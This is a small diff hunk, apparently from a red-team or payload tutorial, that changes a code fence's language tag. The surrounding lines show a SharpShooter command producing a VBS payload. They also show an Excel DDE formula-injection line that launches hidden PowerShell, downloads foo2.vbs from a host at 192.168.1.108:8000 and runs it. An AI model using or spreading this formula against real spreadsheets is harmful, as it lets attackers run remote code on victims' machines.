@@ -51,7 +51,7 @@ python2 SharpShooter.py --stageless --dotnetver 2 --payload vbs --output foo2 --
 
 And inject the command to Microsoft Excel function:
 
-```
+```vba
 =cmd|'/c cmd.exe /c powershell.exe -nop -w hidden iwr -outf %tmp%\\msf.vbs http://192.168.1.108:8000/foo2.vbs & %tmp%\\msf.vbs'!'A1'
 ```
 
